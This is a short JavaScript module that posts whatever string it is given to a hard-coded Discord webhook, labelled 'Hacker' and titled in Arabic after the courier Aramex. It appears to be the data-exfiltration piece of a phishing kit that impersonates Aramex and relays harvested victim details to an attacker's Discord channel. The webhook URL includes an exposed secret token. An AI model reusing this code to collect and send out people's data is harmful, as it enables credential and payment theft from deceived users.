import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1337811153895690324/zxjT5GQ0LtdKSg-2WcFvj_QmiPoKzX24SP3_s1LWxvm0gHy-NzPWhtl2i0hda4yj1vW8",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
